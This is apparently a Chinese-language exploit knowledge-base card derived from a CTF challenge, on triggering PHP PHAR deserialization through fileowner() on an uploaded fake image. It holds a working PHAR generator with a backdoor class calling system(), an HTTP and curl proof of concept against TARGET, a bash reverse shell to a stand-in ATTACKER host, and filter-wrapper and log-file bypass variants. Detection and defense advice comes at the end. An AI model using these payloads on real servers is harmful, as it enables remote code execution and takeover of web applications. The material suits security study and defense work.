---
id: web-php-deserialization-fileowner-phar-trigger-photogallery
title: fileowner() 直接作用于用户可控路径触发 phar:// 反序列化（图片信息查看器场景）
type: scenario
domain: web
path: web/php/deserialization
technique: fileowner-phar-deserialization-trigger
tags:
- php
- phar
- deserialization
- fileowner
- picture-gallery
- pop-chain
- upload
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W
  verified_at: '2026-11-08T17:15:17+08:00'
  notes: 已对照原文核对（class.php 中 backdoor::__destruct 调 system、fileowner 处理用户可控图像路径、生成 phar.phar + setStub/setMetadata/addFromString、改后缀上传后触发、反弹 shell 命令一致）；本次核对未读取图片，仅依据正文；原文未直接写出 phar:// 传参报文，该触发前缀为 PHAR 机制的标准化补全，未复现
url: /docs/web/php/deserialization/web-php-deserialization-fileowner-phar-trigger-photogallery/
draft: false
kb_aliases:
- fileowner phar 反序列化
- filesize/fileowner 触发 phar
- 图片信息接口 phar
- phar 反序列化 冷门触发函数
---

## 一句话结论

「上传图片 → 后端把它的路径交给 `fileowner()` 取所有者 uid」这类看似无害的功能，等于给攻击者一个可控的 `phar://` 触发点：上传一个 PHAR 结构的文件（后缀可任意，只要上传接口放行），再把路径写成 `phar://uploads/x.jpg` 传给 `fileowner()`，PHP 就会解析 PHAR 的 metadata 触发 `__wakeup`/`__destruct`，沿 POP 链落到 `system()`。

## 原理

- PHAR 反序列化不需要 `unserialize()`：任何走 `php_stream_open_wrapper` 的文件函数在遇到 `phar://` 前缀时都会解析该 PHAR 归档的 metadata 并反序列化，这是 PHP 的既定行为，`fileowner()`/`filesize()`/`file_exists()` 等「只查元信息」的函数同样会触发。
- 因此漏洞成立的关键不是「有没有 `unserialize` 调用」，而是「有没有一个可控参数的 file* 函数 + 一个能落地的 PHAR 文件 + 一条可利用的 POP 链」。第三项来自代码里 `include` 的类文件（本例的 `class.php` 里有一个 `__destruct` 直接 `system($this->cmd)` 的类）。
- PHAR 的结构要求：stub 里必须有 `__HALT_COMPILER();`，metadata 用 `setMetadata($obj)` 写入被序列化的恶意对象；文件本身可以伪装成图片（前面加 `GIF89a` 之类），因为 `phar://` 解析的是归档结构，不看扩展名。
- 生成必须在 PHP ≥ 5.3 且 `phar.readonly=0` 的环境下完成（`php -d phar.readonly=0 gen.php`）。
- 因为 payload 落在 metadata 里，上传接口的「只允许 jpg/png」检查通常只看 mime/后缀，改包改后缀即可通过。

## 触发条件

- 存在「用户可控路径 → `fileowner()`/`filesize()`/`file_exists()` 等 phar-aware 文件函数」的功能点。
- 存在任意后缀的上传点，能把生成的 PHAR 落地到已知可访问路径（Web 目录或可被 `phar://` 指向的目录）。
- 代码里有可用的 POP 链起点（`__destruct`/`__wakeup` 等魔术方法，且能到达危险 sink）。
- 目标 PHP 未禁用 `phar://` 包装器。

## 利用步骤

1. 读源码定位触发点：确认 `fileowner($_POST['image_path'])` 之类的调用确实作用于用户输入，且同一文件 `include` 了含魔术方法的类文件。
2. 生成 PHAR：

```php
<?php
class backdoor{
    public $cmd;
    function __destruct(){ system($this->cmd); }
}
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new backdoor();
$o->cmd = 'ls / > 1.txt';
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

   生成命令：`php -d phar.readonly=0 gen.php`，再把产物改名成 `x.jpg`（必要时在文件头加 `GIF89a`）。
3. 上传该文件，记下落盘路径（通常是 `uploads/x.jpg`）。
4. 让触发函数以 `phar://` 访问它：

```http
POST /chal13nge.php HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded

image_path=phar://uploads/x.jpg
```

   此时 `fileowner()` 解析归档 → 反序列化 metadata → `__destruct` 执行 `system('ls / > 1.txt')`。
5. 读取命令输出（本例写到 Web 可访问的 `1.txt`），或把 `cmd` 换成反弹 shell：

```php
$o->cmd = 'bash -c "bash -i >& /dev/tcp/ATTACKER/2333 0>&1"';
```

## PoC

```php
<?php
class backdoor{
    public $cmd;
    function __destruct(){ system($this->cmd); }
}
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new backdoor();
$o->cmd = 'id > /var/www/html/whoami.txt';
$phar->setMetadata($o);
$phar->addFromString("t.txt", "t");
$phar->stopBuffering();
```

```bash
php -d phar.readonly=0 gen.php && mv phar.phar x.jpg   # 上传 x.jpg 后
curl 'http://TARGET/chal13nge.php' --data 'image_path=phar://uploads/x.jpg'
```

## 变体与关联

- 变体：触发函数换成 `getimagesize()`、`filesize()`、`file_exists()`、`md5_file()`、`copy()`、`ZipArchive::extractTo`、`PDO_pgsql::pgsqlCopyFromFile` 等任一 phar-aware 调用；本卡的价值在于 `fileowner()` 这个常被忽视的入口。
- 变体：`php://filter/resource=phar://...` 包裹可绕过对参数前缀 `phar://` 的检查。
- 变体：没有可上传点时，可把 PHAR 写进 session 文件/日志，再 `phar://` 指向该文件。
- 关联：[[web-php-deserialization-phar-read-uploaded-image-pop-chain]]（`file_get_contents` + `phar://` 的常规形态）。
- 关联：[[web-php-deserialization-phar-sourcechain-zip-pgsql-sinks]]（冷门触发函数清单）。
- 关联：[[web-php-getimagesize-sidechannel-file-read]]（同题先用侧信道读源码，才能发现这条 POP 链）。

## 检测与防御

- 防御：任何用户可控路径不得进入 file* 函数；先按固定白名单枚举合法文件名，再在服务端拼接绝对路径。
- 防御：`stream_wrapper` 白名单关闭 `phar://`（`php.ini` 里不能单关，需在代码层校验路径不含 `://` 或做 `realpath` + 前缀校验）。
- 防御：上传目录禁止执行、上传文件强制重编码为真实图片（`imagecreatefrom*` 后重新输出）；生产环境 `phar.readonly=1`。
- 检测：请求参数出现 `phar://`；上传内容含 `__HALT_COMPILER`；Web 目录出现匿名小文件（如 `1.txt`、`whoami.txt`）；`fileowner`/`getimagesize` 调用后紧跟 `system` 子进程。
- 响应：删除落地的 PHAR 与产物文件、排查同 POP 链的所有魔术方法类、修补路径参数校验。
